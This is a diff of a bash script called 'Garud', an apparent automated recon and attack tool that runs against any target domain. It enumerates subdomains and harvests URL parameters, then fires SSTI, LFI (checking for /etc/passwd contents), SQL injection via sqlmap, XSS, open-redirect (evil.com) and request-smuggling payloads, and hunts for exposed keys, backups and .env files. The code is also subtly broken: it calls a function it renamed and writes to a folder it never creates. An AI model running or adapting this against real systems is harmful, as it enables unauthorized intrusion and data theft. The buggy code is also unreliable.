@@ -138,134 +138,151 @@ scan_targets() {
     echo -e "${NORMAL}${BOLD} Threads: ${GREEN}$thrds${NORMAL}"
 }
 
+makeFolders() {
+    mkdir domains/
+    mkdir domains/info/
+    mkdir parameters/
+    mkdir parameters/patterns/
+    mkdir scanresults/
+    mkdir scanresults/xss/
+    mkdir scanresults/nuclei/
+    mkdir scanresults/crlf/
+    mkdir scanresults/sqli/
+    mkdir scanresults/lfi/
+    mkdir scanresults/ssti/
+    mkdir scanresults/mail/
+    mkdir scanresults/files/
+    mkdir scanresults/smuggle/
+    mkdir scanresults/redirect/
+}
+
 run_subenum() {
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n ● Scanning is in progress:${NORMAL}${BOLD} Scanning subdomains of $domain [${GREEN}${BLINK}20%${NORMAL}] \r"
-    assetfinder --subs-only $domain | sort -u > $file-assetfinder.txt
-    python3 ~/tools/Sublist3r/sublist3r.py -d $domain -o $file-sublister.txt &> /dev/null
-    subfinder -silent -d $domain -all -t $thrds -o $file-subfinder.txt > /dev/null
-    amass enum -passive -norecursive -noalts -d $domain -o $file-amass.txt &> /dev/null
+    assetfinder --subs-only $domain | anew -q domains/assetfinder.txt &> /dev/null
+    python3 ~/tools/Sublist3r/sublist3r.py -d $domain -o domains/sublister.txt &> /dev/null
+    subfinder -silent -d $domain -all -t $thrds -o domains/subfinder.txt > /dev/null
+    amass enum -passive -norecursive -noalts -d $domain -o domains/amass.txt &> /dev/null
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Filtering subdomains of $domain [${GREEN}${BLINK}30%${NORMAL}] \r"
     sleep 1s
     if [ -f "$excl" ]
         then
-            cat $file-sublister.txt $file-assetfinder.txt $file-subfinder.txt $file-amass.txt | grep -v "*" | grep -vf $excl | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent > $file-finalsubdomains.txt
+            cat domains/*.txt | grep -v "*" | grep -vf $excl | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent | anew -q domains/finalsubdomains.txt &> /dev/null
         else
-            cat $file-sublister.txt $file-assetfinder.txt $file-subfinder.txt $file-amass.txt | grep -v "*" | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent > $file-finalsubdomains.txt
+            cat domains/*.txt | grep -v "*" | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent | anew -q domains/finalsubdomains.txt &> /dev/null
     fi
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Filtering valid subdomains of $domain [${GREEN}${BLINK}35%${NORMAL}] \r"
     sleep 1s
-    cat $file-finalsubdomains.txt | sort -u | uniq -u | httpx -threads $thrds -tls-probe -csp-probe -silent > $file-alive.txt
-    cat $file-alive.txt | sed -E 's/^\s*.*:\/\///g' > $file-alwpr.txt
+    cat domains/finalsubdomains.txt | sort -u | uniq -u | httpx -threads $thrds -tls-probe -csp-probe -silent | anew -q domains/aliveDomains.txt &> /dev/null
+    cat domains/aliveDomains.txt | sed -E 's/^\s*.*:\/\///g' | anew -q domains/hosts.txt &> /dev/null
 
 }
 
-run_gettitle() {
+run_info() {
     sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Getting titles of valid subdomains of $domain [${GREEN}${BLINK}40%${NORMAL}] \r"
-    cat $file-alive.txt | httpx -threads $thrds -status-code -title -silent > $file-title.txt
-    cat $file-alive.txt | aquatone -chrome-path /snap/bin/chromium -out $file-aqua_out/ -threads 5 -silent &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Fetching some imformations of valid subdomains of $domain [${GREEN}${BLINK}40%${NORMAL}] \r"
+    cat domains/aliveDomains.txt | httpx -threads $thrds -status-code -title -silent | anew -q domains/info/titles.txt
+    cat domains/aliveDomains.txt | aquatone -chrome-path /snap/bin/chromium -out domains/info/aquatone_output/ -threads 10 -silent &> /dev/null
 }
 
 run_params() {
     sleep 1s
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Getting all parameters of $domain [${GREEN}${BLINK}70%${NORMAL}] \r"
-    cat $file-alive.txt | gauplus --random-agent -b png,jpg,svg,gif -t $thrds -o gau-urls.txt
-    cat gau-urls.txt | urldedupe -s > $file-params.txt
-    rm gau-urls.txt
+    cat domains/aliveDomains.txt | xargs -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q parameters/wayback.txt &> /dev/null
+    cat domains/aliveDomains.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt,js -t $thrds -o parameters/gauplus.txt &> /dev/null
+    cat parameters/*.txt | urldedupe -s | anew -q parameters/allParameters.txt &> /dev/null
 }
 
 run_gf() {
     sleep 1s
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Filtering all parameters of $domain [${GREEN}${BLINK}75%${NORMAL}] \r"
-    mkdir patterns/ &> /dev/null
-    cat $file-params.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' > patterns/$file-xss.txt
-    cat $file-params.txt | gf ssrf > patterns/$file-ssrf.txt
-    cat $file-params.txt | gf ssti > patterns/$file-ssti.txt
-    cat $file-params.txt | gf redirect > patterns/$file-redirect.txt
-    cat $file-params.txt | gf sqli > patterns/$file-sqli.txt
-    cat $file-params.txt | gf lfi > patterns/$file-lfi.txt
-    cat $file-params.txt | gf rce > patterns/$file-rce.txt
-}
-
-check_xss() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for xss in $domain [${GREEN}${BLINK}85%${NORMAL}] \r"
-    mkdir vulnerabilities/ &> /dev/null
-    cat patterns/$file-xss.txt | kxss 2> /dev/null | tee vulnerabilities/$file-xss.txt &> /dev/null
-    if [ -n "$bxssServer" ]
-        then
-            dalfox file $file-params.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --multicast --skip-bav -w $thrds -b $bxssServer 2> /dev/null | anew -q vulnerabilities/$file-dalfox.txt &> /dev/null
-        else
-            dalfox file $file-params.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --multicast --skip-bav -w $thrds 2> /dev/null | anew -q vulnerabilities/$file-dalfox.txt &> /dev/null
-    fi
+    cat parameters/allParameters.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | qsreplace "FUZZ" | anew -q parameters/patterns/xss.txt
+    cat parameters/allParameters.txt | gf ssrf | qsreplace "FUZZ" | anew -q parameters/patterns/ssrf.txt
+    cat parameters/allParameters.txt | gf ssti | qsreplace "FUZZ" | anew -q parameters/patterns/ssti.txt
+    cat parameters/allParameters.txt | gf redirect | qsreplace "FUZZ" | anew -q parameters/patterns/redirect.txt
+    cat parameters/allParameters.txt | gf sqli | qsreplace "FUZZ" | anew -q parameters/patterns/sqli.txt
+    cat parameters/allParameters.txt | gf lfi | qsreplace "FUZZ" | anew -q parameters/patterns/lfi.txt
+    cat parameters/allParameters.txt | gf rce | qsreplace "FUZZ" | anew -q parameters/patterns/rce.txt
 }
 
 check_crlf() {
     sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for crlf in $domain [${GREEN}${BLINK}86%${NORMAL}] \r"
-    crlfuzz -l $file-alive.txt -c $thrds -s | anew vulnerabilities/$file-crlf.txt | notify -silent &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for crlf in $domain [${GREEN}${BLINK}85%${NORMAL}] \r"
+    crlfuzz -l domains/aliveDomains.txt -c $thrds -s | anew scanresults/crlf/output.txt | notify -silent &> /dev/null
 }
 
 check_mail() {
     sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for email spoofing errors in $domain [${GREEN}${BLINK}87%${NORMAL}] \r"
-    for target in $(echo "$domain"); do if [[ $(curl --connect-timeout 3 -kls --max-time 3 -d "serial=fred12&domain=${target}" -H "Content-Type: application/x-www-form-urlencoded" -X POST "https://www.kitterman.com/spf/getspf3.py") =~ 'SPF record passed validation test with pySPF' ]]; then echo -e "VULNERABLE: ${target}"; else echo -e "NOT VULNERABLE: ${target}"; fi done | tee vulnerabilities/$file-spf.txt | notify -silent &> /dev/null
-    for target in $(echo "$domain"); do if [[ $(curl --connect-timeout 3 -kls --max-time 3 -X GET "https://dmarcly.com/server/dmarc_check.php?domain=${target}") =~ 'success' ]]; then echo -e "VULNERABLE: ${target}"; else echo -e "NOT VULNERABLE: ${target}"; fi done | tee vulnerabilities/$file-email.txt | notify -silent &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for email spoofing errors in $domain [${GREEN}${BLINK}86%${NORMAL}] \r"
+    for target in $(echo "$domain"); do if [[ $(curl --connect-timeout 3 -kls --max-time 3 -d "serial=fred12&domain=${target}" -H "Content-Type: application/x-www-form-urlencoded" -X POST "https://www.kitterman.com/spf/getspf3.py") =~ 'SPF record passed validation test with pySPF' ]]; then echo -e "VULNERABLE: ${target}"; else echo -e "NOT VULNERABLE: ${target}"; fi done | anew scanresults/email/spf.txt | notify -silent &> /dev/null
+    for target in $(echo "$domain"); do if [[ $(curl --connect-timeout 3 -kls --max-time 3 -X GET "https://dmarcly.com/server/dmarc_check.php?domain=${target}") =~ 'success' ]]; then echo -e "VULNERABLE: ${target}"; else echo -e "NOT VULNERABLE: ${target}"; fi done | anew scanresults/email/email.txt | notify -silent &> /dev/null
 }
 
 check_ssti() {
     sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for ssti vulnerabilities in $domain [${GREEN}${BLINK}88%${NORMAL}] \r"
-    cat ~/ssti-payloads.txt | while read -r line; do cat patterns/$file-ssti.txt | qsreplace "$line" | anew -q ssticheck.txt;done
-    cat ssticheck.txt | xargs -P 100 -I host bash -c "curl -s -L 'host' | grep \"check-ssti49\" && echo -e \"[VULNERABLE] - host \n \"" | grep "VULNERABLE" | anew vulnerabilities/$file-ssti-vulns.txt | notify -silent &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for ssti vulnerabilities in $domain [${GREEN}${BLINK}87%${NORMAL}] \r"
+    cat ~/tools/payloads/ssti.txt | while read -r line; do cat parameters/patterns/ssti.txt | qsreplace "$line" | anew -q ssticheck.txt;done &> /dev/null
+    cat ssticheck.txt | xargs -P 100 -I host bash -c "curl -s -L 'host' | grep \"check-ssti49\" && echo -e \"[VULNERABLE] - host \n \"" | grep "VULNERABLE" | anew scanresults/ssti/output.txt | notify -silent &> /dev/null
     rm ssticheck.txt
 }
 
 check_lfi() {
     sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for lfi vulnerabilities in $domain [${GREEN}${BLINK}89%${NORMAL}] \r"
-    cat ~/lfi-payloads.txt | while read -r line; do cat patterns/$file-lfi.txt | qsreplace "$line" | anew -q lficheck.txt;done
-    cat lficheck.txt | xargs -P 100 -I host bash -c "curl -s -L 'host' | grep \"root:\" && echo -e \"[VULNERABLE] - host \n \"" | grep "VULNERABLE" | anew vulnerabilities/$file-lfi-vulns.txt | notify -silent &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for lfi vulnerabilities in $domain [${GREEN}${BLINK}88%${NORMAL}] \r"
+    cat ~/tools/payloads/lfi.txt | while read -r line; do cat parameters/patterns/lfi.txt | qsreplace "$line" | anew -q lficheck.txt;done &> /dev/null
+    cat lficheck.txt | xargs -P 100 -I host bash -c "curl -s -L 'host' | grep \"root:\" && echo -e \"[VULNERABLE] - host \n \"" | grep "VULNERABLE" | anew scanresults/lfi/output.txt | notify -silent &> /dev/null
     rm lficheck.txt
 }
 
 check_nuclei() {
     sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for vulnerabilities of $domain using nuclei [${GREEN}${BLINK}90%${NORMAL}] \r"
-    cat $file-alive.txt | while read -r line;do nuclei -t ~/nuclei-templates/ -target $line -severity low,medium,high,critical -bs 100 -c 200 -rl 300 -nc -silent;done | tee vulnerabilities/$file-nuclei.txt | notify -silent &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for vulnerabilities of $domain using nuclei [${GREEN}${BLINK}89%${NORMAL}] \r"
+    cat domains/aliveDomains.txt | while read -r line;do nuclei -t ~/nuclei-templates/ -target $line -severity low -c 500 -nc -silent;done | anew scanresults/nuclei/low.txt | notify -silent &> /dev/null
+    cat domains/aliveDomains.txt | while read -r line;do nuclei -t ~/nuclei-templates/ -target $line -severity medium -c 500 -nc -silent;done | anew scanresults/nuclei/medium.txt | notify -silent &> /dev/null
+    cat domains/aliveDomains.txt | while read -r line;do nuclei -t ~/nuclei-templates/ -target $line -severity high -c 500 -nc -silent;done | anew scanresults/nuclei/high.txt | notify -silent &> /dev/null
+    cat domains/aliveDomains.txt | while read -r line;do nuclei -t ~/nuclei-templates/ -target $line -severity critical -c 500 -nc -silent;done | anew scanresults/nuclei/critical.txt | notify -silent &> /dev/null
+}
+
+check_infoleak() {
+    sleep 1s
+    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for directories and sensitive files of $domain [${GREEN}${BLINK}90%${NORMAL}] \r"
+    cat parameters/allParameters.txt | cut -d"?" -f1 | cut -d"=" -f1 | anew -q removed.txt &> /dev/null
+    cat removed.txt | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | anew scanresults/files/output.txt | notify -silent &> /dev/null
+    rm removed.txt
 }
 
 check_sqli() {
     sleep 1s
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for sqli vulnerabilities of $domain using sqlmap [${GREEN}${BLINK}92%${NORMAL}] \r"
-    cat patterns/$file-sqli.txt | qsreplace "FUZZ" | anew -q sqlicheck.txt
-    cat sqlicheck.txt | xargs -P 30 -I X bash -c "python3 ~/tools/sqlmap/sqlmap.py -u X -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir=vulnerabilities/sqlmap_output 2> /dev/null" &> /dev/null
-    rm sqlicheck.txt
+    cat parameters/patterns/sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --output-dir=scanresults/sqli/ 2> /dev/null" &> /dev/null
 }
 
-check_infoleak() {
+check_xss() {
     sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for directories and sensitive files of $domain using dirsearch [${GREEN}${BLINK}94%${NORMAL}] \r"
-    cat $file-params.txt | cut -d"?" -f1 | cut -d"=" -f1 | anew -q removed.txt &> /dev/null
-    cat removed.txt | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | anew vulnerabilities/$file-potenialsentive.txt | notify -silent &> /dev/null
-    rm removed.txt
-    python3 ~/tools/dirsearch/dirsearch.py -w ~/wordlists/big.txt -l $file-alive.txt -x 204,301,302,401,500,502,503,429 -e html,json,php,asp,aspx,log,sql,txt,asp,jsp,bak -r -R 40 --exclude-texts "403 Forbidden", "Log in to" --full-url -q --plain-text-report vulnerabilities/$file-dir.txt 2> /dev/null | notify -silent &> /dev/null
+    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for xss in $domain [${GREEN}${BLINK}95%${NORMAL}] \r"
+    mkdir vulnerabilities/ &> /dev/null
+    cat parameters/patterns/xss.txt | xargs -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | anew -q scanresults/xss/kxss.txt &> /dev/null
+    if [ -n "$bxssServer" ]
+        then
+            dalfox file parameters/patterns/xss.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w $thrds -b $bxssServer 2> /dev/null | anew -q scanresults/xss/dalfox.txt &> /dev/null
+        else
+            dalfox file parameters/patterns/xss.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w $thrds 2> /dev/null | anew -q scanresults/xss/dalfox.txt &> /dev/null
+    fi
 }
 
 check_smuggle() {
     sleep 1s
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for smuggling vulnerabilities of $domain using smuggler [${GREEN}${BLINK}96%${NORMAL}] \r"
-    cat $file-alive.txt | while read -r line; do echo $line;done | xargs -P 100 -I X bash -c "python3 ~/tools/smuggler/smuggler.py -u 'X' --quite" &> /dev/null
+    cat domains/aliveDomains.txt | xargs -P 100 -I % bash -c "python3 ~/tools/smuggler/smuggler.py -u '%' --quite --log scanresults/smuggle/output.txt" &> /dev/null
 }
 
 check_open() {
     sleep 1s
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for open redirection in $domain [${GREEN}${BLINK}97%${NORMAL}] \r"
-    cat patterns/$file-redirect.txt | qsreplace "FUZZ" | anew redirect-open.txt &> /dev/null
-    python3 ~/tools/OpenRedireX/openredirex.py -l redirect-open.txt --keyword FUZZ -p ~/tools/OpenRedireX/payloads.txt | grep "^http" | anew vulnerabilities/redirect.txt | notify -silent &> /dev/null
-    sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" vulnerabilities/redirect.txt &> /dev/null
-    cat patterns/$file-redirect.txt | grep -a -i \=http | qsreplace 'http://www.evil.com/' | while read host do; do curl -s -L $host -I | grep "evil.com" && echo -e "[VULNERABLE] - $host \n "; done | tee $file-vulnred.txt | notify -silent &> /dev/null # this oneliner I got from Hacktify's youtube channel. Video Link: https://youtu.be/Va_TvyBjtKA
-    rm redirect-open.txt
+    python3 ~/tools/OpenRedireX/openredirex.py -l parameters/patterns/redirect.txt --keyword FUZZ -p ~/tools/OpenRedireX/payloads.txt | grep "^http" | anew -q scanresults/redirect/opoutput.txt &> /dev/null
+    sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" scanresults/redirect/opoutput.txt &> /dev/null
+    cat parameters/patterns/redirect.txt | qsreplace 'http://www.evil.com/' | xargs -P 30 -I % bash -c "curl -s -L '%' -I | grep \"evil.com\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | anew scanresults/redirect/output.txt | notify -silent &> /dev/null # this oneliner I got from Hacktify's youtube channel. Video Link: https://youtu.be/Va_TvyBjtKA
+    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Fuzzing for directories of $domain [${GREEN}${BLINK}98%${NORMAL}] \r"
+    interlace -tL domains/aliveDomains.txt -threads 10 -c "fuzzy _target_ ~/wordlists/big.txt" &> /dev/null
     sleep 1s
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Setting things up for $domain [${GREEN}${BLINK}100%${NORMAL}] \r"
     sleep 1s
@@ -273,17 +290,12 @@ check_open() {
     echo -e "${NORMAL}${BOLD} ● Scanning Completed. Thanks for using Garud."
 }
 
-slack_bot() {
+final_bot() {
     sleep 3s
     echo -e "${NORMAL}${BOLD}${YELLOW}\n ● Sending notification to your slack.\n"
-    echo -e "$(cat $file-finalsubdomains.txt | wc -l) subdomains found of $domain" | notify -silent &> /dev/null
-    echo -e "$(cat $file-alive.txt | wc -l) active urls found of $domain" | notify -silent &> /dev/null
-    echo -e "$(cat vulnerabilities/* | wc -l) vulnerabilities found of $domain" | notify -silent &> /dev/null
-    cat vulnerabilities/$file-dalfox.txt | notify -silent &> /dev/null
-    function notification_text() {
-        echo -e "Hii $(whoami),\nRecon completed for $domain.\nAll your outputs are saved in $(pwd).\n Thanks for using Garud";
-    }
-    python3 ~/slack-bot.py "$(notification_text)."
+    echo -e "$(cat domains/finalsubdomains.txt | wc -l) subdomains found of $domain" | notify -silent &> /dev/null
+    echo -e "$(cat domains/aliveDomains.txt | wc -l) active urls found of $domain" | notify -silent &> /dev/null
+    echo -e "Hii $(whoami),\nRecon completed for $domain.\nAll your outputs are saved in $(pwd).\n Thanks for using Garud" | notify -silent &> /dev/null
 }
 
 run_scans() {
@@ -292,16 +304,17 @@ run_scans() {
     run_gettitle
     run_params
     run_gf
-    check_xss
     check_crlf
     check_mail
     check_ssti
     check_lfi
     check_nuclei
-    check_sqli
     check_infoleak
+    check_sqli
+    check_xss
+    check_smuggle
     check_open
-    slack_bot
+    final_bot
     exit 1
 }
 
